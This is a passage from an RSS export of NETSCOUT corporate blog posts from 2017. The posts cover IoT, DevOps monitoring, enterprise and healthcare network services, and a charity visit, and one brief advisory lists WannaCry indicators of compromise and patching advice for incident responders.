  <content:encoded><![CDATA[<p>Technologists, visionaries, and experts from all sectors of the economy recently converged on Santa Clara, California for the “World’s Largest IoT Conference”. &nbsp;What made this conference unique is that it wasn’t about the role that 5G, NB-IoT or other wireless protocols will play in enabling IoT, but rather it was about what people and organizations are doing and planning for with IoT. It’s not every day that you get to hear executives from Coca-Cola, GE, LVMH, iRobot, Google, Facebook and others speaking on the status of IoT.</p>

<p>Moving from keynotes to breakout sessions, one thing was very clear:&nbsp; IoT means everything to everyone, from monitoring jet engines, pipelines and power generation to vacuums and thermostats. The second thing that was very clear was, with the exception of some work in industrial IoT, the reality falls far short of the hype.</p>

<p>Most of the companies for whom the promise of IoT holds the greatest promise were not born as digital companies. Even industrial IoT companies, whose devices have built-in sensor technology, lack the DNA of rapid adoption of technological change. Sometimes the primary challenge is just getting started. Determining where to start will have a significant impact on the potential success or failure of IoT. &nbsp;While the greatest benefit may be to “boil the ocean”, it also entails the greatest risk since organizations must successfully build the IoT infrastructure as well as transition its people and processes to a digital mindset. So, often, the alternative is to undertake a small, “science fair project”. Unfortunately, these tend to lack organizational commitment further increasing the risk of failure.</p>

<h4 data-fontsize="13" data-lineheight="20"><strong>Words of Wisdom for IoT Project Teams: Focus on Your Unique Data</strong></h4>

<p>To increase the probability of success, the speakers offered a consistent message. If project teams focus on improving worker safety or reducing risks that are unique challenges to the business, the project team will increase the probability of success and sustained organizational commitment. To do this, teams need to understand the unique data that the business holds but will only be able to access and act upon with an IoT infrastructure.</p>

<p>Once an organization understands the unique data that exists within an IoT network, the project team needs to understand that successful IoT is about leveraging an ecosystem – cloud, network, fog, security, assurance, ISVs, and system integrators – to unlock the data. Teams should not attempt to build every component as most organizations lack the competency to make every aspect function together. Rather, teams need to focus on their unique environments and challenges and leverage the IoT ecosystem to make it work.</p>

<p>Of course, this still doesn’t really help narrow down options because most likely there will be multiple IoT options available. For this, there was uniform agreement on the importance of the business case. The beauty of the business case is that it allows teams to evaluate costs and benefits of multiple options before committing money and resources. In addition, it allows management to understand the investment, commitments, and expected outcomes from pursing an IoT project. Ultimately, the objective of the business case should be to prove out that the project either generates revenue or reduces cost. Teams need to remember that it is easiest to pivot strategy during the business case phase.</p>

<p>As IoT projects move from the business case phase to proof of concept (PoC), companies need to understand that IoT is a journey not a destination. IoT teams need to focus on enhancing their core competencies, be it fluid movement, power generation, transportation systems, or whatever. How can they become more efficient, more productive, or open up new business models? Teams should not get lost in trying to engineer all the complexities that will be part of the IoT infrastructure. The Internet of Things is built on an ecosystem of partnerships and collaboration. Teams who may not have grown up as digital companies need to embrace a digital mindset.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/IoT_Conference1200x480.jpg" length="161349" type="image/jpeg"/>
    <guid isPermaLink="false">ff8886bd-dc88-4174-b8a3-58a2a3127f1a</guid>
    <pubDate>Wed, 24 May 2017 10:51:53 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Mike Serrano</dc:creator>
    </item>
<item>
  <title>Helping Orphans in China Shows NETSCOUT’s Heart of Gold</title>
  <link>http://localhost:7996/blog/helping-orphans-china-shows-netscouts-heart-gold</link>
  <description>Seeking medical treatment for children with disabilities is always difficult. For orphaned children, without a family or support network to help them overcome the many challenges they face, it’s even more complicated. All too often, poor families are unable to bear the cost of treating disabled or seriously ill children. For some, they are left with no choice but to turn to...</description>
  <content:encoded><![CDATA[<p>Seeking medical treatment for children with disabilities is always difficult.&nbsp; For orphaned children, without a family or support network to help them overcome the many challenges they face, it’s even more complicated.</p>

<p>All too often, poor families are unable to bear the cost of treating disabled or seriously ill children. For some, they are left with no choice but to turn to government orphanages. Unfortunately, due to the high cost of the medical treatment they require, they may not get all the help they need, even when in the government’s care. In China, this is where Children’s Hope Foundation (CHF), a local non-governmental organization (NGO) based in Beijing, offers another way to support these children.</p>

<p>CHF has helped 7,259 disabled orphans since the foundation opened its doors, offering resources to provide safe accommodations, medical treatment, and educational assistance. In particular, Alenah’s Home is a special care facility that helps orphans receive medical treatment and rehabilitation services in Beijing. Between 2004 and 2016, 130 children have been fostered at Alenah’s Home, with 70 of them having been adopted.</p>

<h4 data-fontsize="18" data-lineheight="27"><strong>NETSCOUT Volunteers Get Hands-on</strong></h4>

<p><img align="right" alt="NETSCOUT Community" height="266" src="http://localhost:7996/sites/default/files/Bejing-2.jpg" style="float:right;margin-left:15px;" width="200" /><img align="right" alt="NETSCOUT Community" height="266" src="http://localhost:7996/sites/default/files/Bejing-1.jpg" style="float:right;" width="200" />Earlier this year on three separate occasions, NETSCOUT employees participated in activities that included helping to feed the children, reading stories, and teaching them to paint and sing. This sort of hands-on involvement is absolutely vital to these children, who often-times lack the comforts of this type of close comfort and attention.</p>

<p>Cindy Shi, from NETSCOUT’s Human Resources team, has taken the lead on organizing the volunteer efforts at CHF. “Every mother wants to give their children the best care, but these disabled orphans don’t have any family to look out for them. That’s where we can make a big difference. For me personally, it is very rewarding to help these disabled kids and provide them with a feeling of love and support,” explained Cindy. “The volunteers at Alenah’s Home are the closest thing these kids get to having a family until they can find a new adopted home or foster care placement. So, being able to give them a sense of hope and help them get much needed medical care is something that fills our hearts.”</p>

<p>Of the NETSCOUT volunteers who participated, most indicated they wanted to return to the Alenah’s Home again in the near future.</p>

<h4 data-fontsize="18" data-lineheight="27"><strong>Helping an Eight-year Old with Cerebral Palsy</strong></h4>

<p>Cindy expressed pride in being a member of a company that was committed to supporting local communities through charitable activities and service projects such as CHF. “I feel good about working for a company that cares like this. When you see firsthand how big a difference this makes, you can’t help but feel good. For example, while we were at Alenah’s Home, we met an 8-year old girl who suffers from cerebral palsy. Because of her illness, she’s unable to speak and she struggles to make simple physical movements. All of our volunteer team members took turns holding and talking to her. It was such a powerful experience to have been able to help this little girl feel better,” added Cindy.</p>

<p>The NETSCOUT team plans to return to Alenah’s Home in the coming months to continue to provide care and support. The company’s Beijing engineering team has expressed a desire to do all it can for those in need.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/NETSCOUTcommunity-Bejing1146x476.jpg" length="169844" type="image/jpeg"/>
    <guid isPermaLink="false">6a84ac11-1150-4e5d-9371-ddf1da1d47ce</guid>
    <pubDate>Thu, 18 May 2017 08:32:14 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Is It Safe-to-Fail for DevOps?</title>
  <link>http://localhost:7996/blog/it-safe-fail-devops</link>
  <description>For organizations like yours, the upside of DevOps is clear: increased productivity, faster time to deployment and accelerated remediation. As these stats from Puppet’s 2016 State of DevOps report show, high-achieving IT organizations understand the need for speed.</description>
  <content:encoded><![CDATA[<div align="center"><img alt="" border="0" src="https://mediashower.com/img/3CA4328E-B787-11E6-92B3-9BDEEEB8FB3D/bigstock--156614741_600x.jpg" width="600" /></div>

<p> </p>

<p>For organizations like yours, the upside of DevOps is clear: increased productivity, faster time to deployment and accelerated remediation. As these stats from Puppet’s <a href="https://puppet.com/resources/report/2016-state-devops-report" target="_blank">2016 State of DevOps</a> report show, high-achieving IT organizations understand the need for speed.</p>

<ul><li>High achiever IT departments deploy 200 times faster, with lead times that are 2,555 times faster.</li>
	<li>Their change failure rates are three times lower, and their recovery times are 24 times faster.</li>
	<li>They spend half as much time remediating security issues and 22 percent less time on unplanned work and rework.</li>
</ul><p>Yet DevOps isn’t all rainbows and unicorns. New ways of doing things unleash new challenges. Increased speed requires you to tackle application and service performance management in a whole new way.</p>

<h4>Production Pressures</h4>

<p><a href="https://www.linkedin.com/pulse/what-devops-day-doesnt-want-you-know-isnt-automation-jacob-ukelson?redirectFromSplash=true" target="_blank">Continuous deployment and continuous delivery</a> are two different beasts, according to Jacob Ukelson of Lecture Monkey. Continuous Deployment deals only with the technical aspects of moving workloads efficiently from one environment in the pipeline to the next, ensuring the new environment is properly set up and configured.</p>

<p>Continuous Delivery, on the other hand, factors also business impacts into the considerations. For example, if the velocity of delivering new digital services into production environments is accelerated but their quality is poor, then the overall level of Continuous Delivery is degrading rather than improving. Therefore, accelerating the continuous deployment pipeline is not necessarily effective from a business perspective. Unless the production environment is truly fail-safe, accelerating the continuous deployment pipeline would not help businesses to improve their agility. It would simply shift the bottleneck of delivering value to the customers, through app development, into the production environment.</p>

<div align="center"><img alt="" border="0" src="https://mediashower.com/img/3CA4328E-B787-11E6-92B3-9BDEEEB8FB3D/bigstock-Safety-Net-7814224_600x.jpg" width="600" /></div>

<p> </p>

<p>By delivering applications into a safe-to-fail production environment the developers can accelerate their velocity since they don’t need to worry about creating fail-safe applications. As David Snowden of Cognitive Edge defines it, <a href="http://cognitive-edge.com/blog/7-principles-of-intervention-in-complex-systems/" target="_blank">safe-to-fail</a> means that no matter what happens, you can survive the consequences and recover.</p>

<p>But in a chaotic production environment, acting without deep visibility into your system and applications would hardly qualify as safe-to-fail.</p>

<h4>Continuous System-Level Assurance</h4>

<p>Production environments get exposed to human error. After all, it’s not economical to maintain a separate production environment to test your deployment automation processes. You have to gain system-level visibility into your environment. Or, as we say at NETSCOUT, you need the ability to “<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="33c71847-aa32-464b-8335-4cb34ff76e18" href="http://localhost:7996/solutions/devops-monitoring/agility" title="Enhancing DevOps Agility">see the whole of the moon</a>.”</p>

<p>System-level visibility is comprised of all the subsystems, including the applications, which are instrumental in the service delivery to consumers. Our continuous system-level performance management platform monitors all the wire-data traversing the critical service delivery links of your infrastructure. It proactively detects service degradation and gives you insight into the subsystems and their interdependencies. You get the telemetry of load, latency and failure metrics across all the sub-systems, including server, applications, service enablers, network and databases. Instead of just seeing what’s going wrong at the application level, you can get to the root cause at the system-level. This insight helps slash mean time to repair (MTTR) by tracing multiple problems to a single root-cause and establish a production environment that is truly safe-to-fail.</p>

<p>As Snowden reminds us, “Don’t start any experiment, safe-to-fail or otherwise, unless you can monitor its impact in real time.”</p>

<p><strong>See how organizations like yours are <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="70e75c43-9e15-4ef8-a611-d3d08bf1763f" href="http://localhost:7996/voice-of-customer" title="Voice of The Customer">bringing order to chaos</a> with continuous system-level assurance. <img alt="" border="0" src="https://mediashower.com/content?Action=tp&amp;cid=51048" /></strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/devops-blog-1200x480.jpg" length="108624" type="image/jpeg"/>
    <guid isPermaLink="false">0298f109-bc8e-4e83-8a5e-96c6671b2a70</guid>
    <pubDate>Wed, 17 May 2017 08:46:17 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>Seizing the Enterprise Market Opportunity</title>
  <link>http://localhost:7996/blog/seizing-enterprise-market-opportunity</link>
  <description>Despite a strong, stated focus on small and midsized businesses (SMBs) by both cablecos and telcos over the past decade, big business still accounts for the lion’s share of commercial revenue for service providers overall. In fact, in a recent survey of 64 service providers conducted by Heavy Reading for NetScout, more than one third (nearly 36%) of the respondents said...</description>
  <content:encoded><![CDATA[<p>Despite a strong, stated focus on small and midsized businesses (SMBs) by both cablecos and telcos over the past decade, big business still accounts for the lion’s share of commercial revenue for service providers overall. In fact, in a recent survey of 64 service providers conducted by Heavy Reading for NetScout, more than one third (nearly 36%) of the respondents said companies with more than 500 employees generated the greatest revenue for them.</p>

<p>What’s more, service providers plan to place even greater stress on both the large and midsized business markets over the next few years. According to the survey, nearly two fifths (39%) of providers are now targeting the enterprise space, naming it as their biggest commercial priority over the next year, while slightly more than a third (34%) are zeroing in on the midsized market. Clearly, then, the enterprise market will see the most competition by service providers as they increasingly pursue the companies with the biggest purses.</p>

<p>Reflecting this enhanced emphasis on enterprises, service providers are starting to take many steps to keep pace with and cater to the swiftly changing commercial market. For one thing, providers are expanding their product portfolios beyond basic data, voice and video services to encompass more advanced products and services, such as virtual private networks (VPNs), software firewalls, other security products, managed services, other IT products, infrastructure- on-demand/infrastructure-as-a-service (IaaS) and ever-evolving platform-as-a-service (PaaS) offerings, to name just a few. In the Heavy Reading survey, for instance, more than 87% of providers ranked such “enhanced services” highly.</p>

<p>Service providers are also placing greater emphasis on more stringent service-level agreement (SLA) guarantees of service delivery and performance, even for their most basic service offerings. In our survey for&nbsp;<a href="https://www.lightreading.com/complink_redirect.asp?vl_id=3720">NETSCOUT Systems Inc.</a>&nbsp;(Nasdaq: NTCT), more than two fifths (42%) of respondents termed SLAs as “critical” today, meaning that most of their commercial customers now require these written, strictly enforceable service guarantees. Looking ahead, more than three fifths (62%) of respondents said SLAs will be a critical offering in the future.</p>

<p>In addition, service providers are developing more sector-specific products to meet the rising demand for specialized, even customized services. For example, the survey found that providers are now seeing much promise for such advanced, specialized offerings as secure WAN networking, infrastructure-on-demand and united communications in their biggest vertical markets as those markets rapidly evolve.</p>

<p>Finally, providers are turning to cloud-based services to meet the rising enterprise customer demand for more efficient, virtualized offerings. In the survey, more than four fifths (or 81%) of respondents named IaaS as the cloud-based type of offering they now offer or plan to offer in the near future, followed by platform-as-a-service (PaaS) at 58% and software-as-a-service (SaaS) at 44%. That represents a clear acknowledgement by providers that the proper access infrastructure, be it physical or virtual, must be in place first before they can offer other types of services to commercial customers.</p>

<p>Given all these trends, where are the greatest opportunities for service providers in the enterprise market? The answers vary markedly by vertical, with some sectors vastly different from others.</p>

<p>Consider the key healthcare, education and government verticals first. In all three markets, survey respondents see secure WAN networking as the most promising service offering. Infrastructure-on-demand also scores highly, at least in the first two sectors.</p>

<p>Yet the hospitality, finance/banking and retail sectors are much different in the services they use. Outsourced IT services lead the way in hospitality, followed by secure, high-availability data center services. In the finance/banking arena, high-bandwidth, low-latency connectivity is the top choice, trailed closely by secure branch connectivity. And in the retail market, VPN services appear to be most promising offering, with infrastructure-on-demand the next most popular.</p>

<p>As a result, look for cablecos, telcos and other service providers to invest more and more heavily in enterprise-oriented networks, software, products, services, features and service guarantees over at least the rest of the decade. With providers still seeing so much opportunity for growth and so many promising areas for expansion, and with cloud-based services offering a fresh opportunity for entry into the enterprise market, the sky really does appear to be the limit right now.</p>

<p><em>This blog post is sponsored by&nbsp;<a href="https://www.netscout.com/">NETSCOUT</a>&nbsp;and&nbsp;released by<a href="https://www.lightreading.com/services/cloud-services/seizing-the-enterprise-market-opportunity/a/d-id/732595?" target="_blank">&nbsp;Light Reading</a><strong>.</strong></em></p>

<p>— Alan Breznick, Cable/Video Practice Leader,&nbsp;<a href="https://www.lightreading.com/" target="_blank">Light Reading</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/ServiceAssuranceEnterprise1200x480.jpg" length="95716" type="image/jpeg"/>
    <guid isPermaLink="false">65a93aec-1b09-43aa-8259-65dfbbbfaab4</guid>
    <pubDate>Mon, 15 May 2017 10:05:59 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Mike Serrano</dc:creator>
    </item>
<item>
  <title>Service Assurance &amp; Digital Transformation in Health Care</title>
  <link>http://localhost:7996/blog/service-assurance-digital-transformation-health-care</link>
  <description>Today’s health groups, hospitals, clinics and ambulatory surgical centers treat more patients than ever before. One in 8 people globally is age 60 or over; by 2050, that statistic will be 1 in 5. In 2015, the Medicare Access &amp; CHIP Reauthorization Act of 2015 (MACRA) pushed Medicare toward value-based reimbursement. As a result, hospitals may no longer receive payment for every...</description>
  <content:encoded><![CDATA[<p>Today’s health groups, hospitals, clinics and ambulatory surgical centers treat more patients than ever before. One in 8 people globally is <a href="https://www.unfpa.org/ageing" target="_blank">age 60 or over</a>; by 2050, that statistic will be 1 in 5.</p>

<p>In 2015, the Medicare Access &amp; CHIP Reauthorization Act of 2015 (MACRA) pushed Medicare toward value-based reimbursement. As a result, hospitals may no longer receive payment for every procedure they perform; they get paid according to the quality of patient outcomes.</p>

<p>Although younger patients use fewer health care services, they’re paying more <a href="https://www.washingtonpost.com/news/wonk/wp/2016/06/27/one-reason-a-historic-slowdown-in-health-spending-didnt-feel-like-it/?utm_term=.b0deefeb90cb" target="_blank">health care costs</a> out of pocket. In employer-sponsored health plans, deductibles are rising faster than premiums, and more hospitalizations either require coinsurance or fall under a patient’s deductible. Increasing out-of-pocket costs aren’t good news, but they’ve had one positive effect: patients who are paying out-of-pocket for health care are less tolerant of bad experiences.</p>

<p><strong>Digital Transformation for Happier, Healthier Patients</strong></p>

<p>With pressure from both younger patients and Medicare’s changing rules, health care providers must deliver better service to stay competitive. The digital transformation can deliver better patient experiences and outcomes, but it requires robust, reliable IT infrastructure for 24/7/365 service assurance.</p>

<p style="padding-left:40px;"><strong><em>Mobile and IoT</em></strong><br />
Increased smartphone and tablet usage by hospital staff and patients, plus the explosive growth of IoT devices, adds many endpoints to local networks. Hospitals need enterprise mobility management solutions for access and device management and security tools to encrypt sensitive data.</p>

<p style="padding-left:40px;"><strong><em>Cloud</em></strong><br />
Hospitals host workloads in the cloud, and they share patient records using EHR/EMR SaaS solutions. The cloud empowers integration with health information exchanges and government agencies, enabling tasks ranging from claims processing to pandemic preparedness.</p>

<p style="padding-left:40px;"><strong><em>UC&amp;C</em></strong><br />
Training, remote diagnosis, and internal collaboration rely on available UC&amp;C solutions. Sharing resource-intensive files within PACS systems while simultaneously supporting video conferencing requires not only bandwidth but also complex IT infrastructure components.</p>

<p style="padding-left:40px;"><strong><em>Big Data</em></strong><br />
ERP systems for aggregating, analyzing and reporting business data are familiar to hospitals. Gleaning value from unstructured data, such as what’s collected from health care IoT, isn’t. Big data offers enormous potential, but it also presents new storage, processing, and network security challenges.</p>

<p style="padding-left:40px;"><strong><em>New Kinds of Hardware</em></strong><br />
ITOPS teams are used to servers and switches, but surgical robots, 3D bioprinters or sensors implanted in patients’ bodies demand new skills. Maintaining communications with innovative devices, troubleshooting them and maintaining them – these are uncharted waters for many IT pros.</p>

<div align="center"><img alt="" src="https://mediashower.com/img/2542332A-FE40-11E6-B66D-934108193746/bigstock-Man-having-video-chat-with-doc-120693752_600x.jpg" /></div>

<p> </p>

<p><strong>Continuous Monitoring for Service Assurance</strong></p>

<p>The digital transformation tools reshaping the patient experience also mean big demands for hospital networks. To maintain continuous service across all your IT environments, NETSCOUT’s nGeniusONE service assurance platform combines end-to-end monitoring with analytics capabilities. Our Adaptive Service Intelligence converts traffic-based data into structured metadata, optimizing it for a range of analytics platforms.</p>

<p>ASI identifies signs of outages before they happen, so you can diagnose and repair them quickly. Application errors, demand spikes or slow transaction responses no longer have to become full-blown failures.</p>

<p>When a <a href="https://www.theregister.co.uk/2015/07/21/robot_surgery_kills_americans/" target="_blank">surgical robot powers down</a> mid-surgery, or its video screen goes dark, patients’ lives could be at risk. Deliver experiences above and beyond your competitors – and protect your digital transformation investments – with NETSCOUT’s continuous service assurance.</p>

<p><strong>Learn more about how <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="05964b93-c177-4f1c-a905-b57eedb445df" href="http://localhost:7996/voice-of-customer/digital-transformation-healthcare" title="Digital Transformation for Healthcare: Challenges &amp; Solutions">digital transformation challenges and solutions</a> are reshaping the health care industry.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DoctorsandNurse1200x480.jpg" length="159621" type="image/jpeg"/>
    <guid isPermaLink="false">5a1cb04b-f99d-4a2e-bd7d-84b8fdca4abb</guid>
    <pubDate>Mon, 15 May 2017 09:57:17 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>WannaCry</title>
  <link>http://localhost:7996/blog/asert/wannacry</link>
  <description>Information regarding the WannaCry ransomware is spreading as quickly as the malware itself and is expected to do so throughout the weekend. This blog provides some information from our malware processing system that may, or may not be, available elsewhere. The WannaCry ransomware propagates by exploiting a remote code execution vulnerability in Microsoft Windows that surfaced...</description>
  <content:encoded><![CDATA[<p>Information regarding the WannaCry ransomware is spreading as quickly as the malware itself and is expected to do so throughout the weekend. This blog provides some information from our malware processing system that may, or may not be, available elsewhere.</p>

<p>The WannaCry ransomware propagates by exploiting a remote code execution vulnerability in Microsoft Windows that surfaced via the Shadowbrokers dump on April 14th. Microsoft released a patch on March 14th. Systems should be patched or SMBv1/CIFS disabled immediately to reduce the likelihood of infection:</p>

<p>Microsoft Security Bulletin MS17-010 – Critical - <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010">https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010</a></p>

<p>Additionally, appropriate network segmentation is always a best practice and should also be used to limit the exposure of Microsoft SMB not only externally, but on internal networks as well. The following information is derived from dynamic analysis of 14 WannaCry samples and is provided as additional context for incident responders:</p>

<h2>Behavioral Signatures from Malware Sandbox:</h2>

<ul>
	<li>Adds autostart object</li>
	<li>Dumps and runs batch script</li>
	<li>Modifies registry autorun entries</li>
	<li>Creates executable in application data folder</li>
	<li>Modifies file attributes via attrib.exe</li>
	<li>Modifies Windows Registry from the command line</li>
	<li>Renames file on boot</li>
</ul>

<h2>Mutexes:</h2>

<ul>
	<li>Global\MsWinZonesCacheCounterMutexA</li>
</ul>

<p><strong>Created Files of Interest:</strong></p>

<ul>
	<li>!Please Read Me!.txt</li>
	<li>@WanaDecryptor@.exe</li>
	<li>tor.exe</li>
	<li>taskdl.exe</li>
	<li>*.bat</li>
</ul>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">06f1c020-e8c4-4e11-93d7-681ec8b2ce0c</guid>
    <pubDate>Sat, 13 May 2017 01:12:53 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Could IoT and Blockchain Be the Next Big Thing?</title>
  <link>http://localhost:7996/blog/could-iot-and-blockchain-be-next-big-thing</link>
  <description>A drug prescribed to a patient becomes visible to all relevant providers, regardless of electronic health record (EHR) systems compatibility. A connected car automatically pays for tolls and parking, and it uses barcode technology to open its trunk to receive a dropped-off package. A Mobility-as-a-Service (MaaS) station offers any kind of transportation to passengers and...</description>
  <content:encoded><![CDATA[<p>A drug prescribed to a patient becomes visible to all relevant providers, regardless of electronic health record (EHR) systems compatibility. A connected car automatically pays for tolls and parking, and it uses barcode technology to open its trunk to receive a dropped-off package. A Mobility-as-a-Service (MaaS) station offers any kind of transportation to passengers and automatically collects payment for public transit, electric car charging and bike sharing. What’s the key to making all of these scenarios a reality? IoT devices and blockchain.</p>

<p>By 2019, the capital markets applications for <a href="https://www.businessinsider.com/blockchain-and-iot-devices-could-revolutionize-the-supply-chain-2016-11" target="_blank">blockchain</a> will reach $400 million, growing at a 52 percent compound annual growth rate. By 2020, 1 in 5 IoT deployments will utilize basic blockchain services. Using blockchain for IoT transactions and data sharing can ease security concerns, remove single points of failure, streamline processes and cut costs. When supported by service assurance, IoT and blockchain can unleash mind-blowing innovations in every industry.</p>

<p><strong>Improved Security</strong></p>

<p>Blockchain’s distributed database decentralizes ledgers by sharing a chain of transactions between multiple nodes. Although the blocks are publicly visible, their contents are available only to organizations with the correct encryption key.</p>

<p>Because transactions must be authorized by multiple parties before acceptance, blockchain creates a high degree of trust. Additionally, you can only add transactions, not remove or alter them, making blockchain attractive to organizations subject to Sarbanes-Oxley (SOX), HIPAA and other regulatory frameworks.</p>

<p>On an IoT network, blockchain can facilitate not only financial transactions but also secure messaging between devices. By operating according to embedded smart contracts, two parties can share data without compromising the privacy of its owner. Although blockchain doesn’t solve every security problem for IoT devices, such as the <a href="https://www.arbornetworks.com/iot-botnets-ddos-attacks-what-you-need-to-know" target="_blank">hijacking of IoT devices for use in DDoS botnets</a>, it helps protect data from malicious actors.</p>
<img alt="IoT and Blockchain" data-entity-type="file" data-entity-uuid="5128ba7f-7041-4be8-b227-fe471663464a" src="http://localhost:7996/sites/default/files/inline-images/Solutions-Cloud-Business-1200x675.jpg" class="align-center" /><p> </p>

<p><strong>Increased Resilience</strong></p>

<p>As IoT devices multiply – Business Insider projects 24 billion <a href="https://www.businessinsider.com/there-will-be-34-billion-iot-devices-installed-on-earth-by-2020-2016-5" target="_blank">connected devices</a> by 2020 –  the traditional server/client models of handling network traffic will prove too cumbersome. The simplicity of distributed blockchain transactions, supported by growth in edge computing devices and 5G networks, will enable faster, more efficient communications between autonomous devices without passing them through single points of failure.  Blockchain can also maintain faithful records of IoT device functions, making it possible for devices to communicate autonomously without a centralized authority.</p>

<p><strong>Service Assurance for Blockchain and IoT</strong></p>

<p>Like any digital transformation technology, blockchain and IoT will add complexity to the IT infrastructure. This can include edge devices and servers participating in blockchain transactions, middleware for encryption and authentication, and virtual machines for distributed databases and applications. Although autonomous device communications and accelerated transactions can boost efficiency, and improved availability and added security can cut costs, service assurance is more necessary than ever before. In an IoT/blockchain environment, service delivery can be impacted by load, latency and errors.  And because blockchain is basically a highly distributed database, assuring service delivery is more difficult and requires truly holistic end-to-end visibility into packet and session flow – across load balancers, gateways, service enablers (including DNS), network, servers and databases (distributed in this case) and all their interdependencies.</p>

<p>Let’s look at just DNS. The coming growth in IoT devices in combination with blockchain will mean a surge of DNS requests and DNS dependent services which can have a major impact on service delivery and performance. The ultra-low latency of DNS services should be of concern for business continuity and assuring IoT performance quality.   If DNS performs badly, then those IoT and blockchain services will suffer.   That can mean parts of the connected world that are becoming more and more dependent on automation will come to a standstill.  Healthcare, manufacturing, energy distribution, transportation, and financial transactions can get derailed because of DNS problems.   However, losing control is avoidable with the right service assurance platform, where IT teams get visibility into DNS issues like errors and busy servers.   NETSCOUT’s nGeniusONE platform provides real-time visibility by analyzing traffic flows over the network and generating smart data, the basis for a comprehensive view of <a href="http://localhost:7996/sites/default/files/2016/04/netscout-ql-ngeniusone-platform-dns.pdf">DNS service performance</a> across complex N-tier application environments.  The combination of smart data and superior analytics allows IT professionals to understand the full context of the service and DNS anomalies contributing to poor user experience or application performance.</p>

<p>The IoT and blockchain revolution isn’t a matter of “if” — it’s a matter of “ready or not, here it comes.”</p>

<p><a class="link" href="http://localhost:7996/sites/default/files/2016/09/ema-netscout-digitaltransformation-0616-wp.pdf">Download the research paper -- Insight Into Everything: The Criticality of a Business Assurance Platform for Digital Transformation</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/solutions-iot-sunsetcityconnected-1200x675.jpg" length="513362" type="image/jpeg"/>
    <guid isPermaLink="false">6d87a22c-7e65-49f1-8669-be7645d8478d</guid>
    <pubDate>Thu, 11 May 2017 08:55:06 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Ron Lifton</dc:creator>
    </item>
<item>
  <title>Digital Transformation Communications Service Providers</title>
  <link>http://localhost:7996/blog/digital-transformation-communications-service-providers</link>
  <description>There is no question upgrading or rebuilding a telecommunications network takes years of careful planning and millions of dollars to implement. The question is, after making such a substantial investment, how can you make sure this new network will deliver on the promises of digital transformation? In Europe, Vodafone Group extended its partnership with NETSCOUT, planning to...</description>
  <content:encoded><![CDATA[<p>There is no question upgrading or rebuilding a telecommunications network takes years of careful planning and millions of dollars to implement.&nbsp; The question is, after making such a substantial investment, how can you make sure this new network will deliver on the promises of digital transformation?</p>

<p>In Europe, Vodafone Group extended its partnership with NETSCOUT, planning to use NETSCOUT solutions to help analyze and enhance network performance, and improve customer experience.&nbsp; These solutions cover all its deployed technology domains, as well as future systems, such as 5G.</p>

<p>New Zealand’s Spark plans to migrate to an all IP-based infrastructure, which is consistent with digital transformation trends that are sweeping the globe. Spark’s&nbsp;<a href="http://www.zdnet.com/article/spark-details-network-upgrade-plans-with-ericsson/" target="_blank">recent announcement was nicely summarized in by ZD Net</a>.&nbsp; The intent to implement technologies such as NFV/SDN, 5G and IP Multimedia Subsystem (IMS) are all indicative of the need to effectively utilize “pillars-of-innovation” that empower communications service providers (CSPs) to accelerate the delivery of new Cloud-based services and applications to customers, while reducing their OPEX and CAPEX in the process.</p>

<p>To realize this vision, however, it is critical to develop a comprehensive Service Assurance and Security Assurance strategies that are based on end-to-end visibility into all voice, video and data services across the entire new infrastructure, including radio access network (RAN), Wi-Fi, IMS, Evolved Packet Core and NFV/SDN. Since every voice, video and data session is traversing this infrastructure via IP traffic flows (a.k.a wire-data); analysis of these flows is the best source of visibility. To optimize the insight, these IP traffic flows need to be collected across wireless, wired, virtual and physical environments and processed in real-time at the source, for scalability reasons. The analysis of the processed and organized data can then be effectively analyzed to offer insights into network and service assurance, subscriber analytics, Big Data analytics, CEM and cybersecurity, ensuring cost-effective, high-performance digital service delivery.</p>

<p>These insights can be used to continually improve offerings, drive new revenue and reduce cost – essentially the path to your future.&nbsp; To capture these insights and truly future-proof your investment, planning for the future needs to include planning for service assurance and security assurance.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/DXofCSPs1200x480.jpg" length="286694" type="image/jpeg"/>
    <guid isPermaLink="false">f4d5afa3-95ec-4f6d-b752-8be3f25727a1</guid>
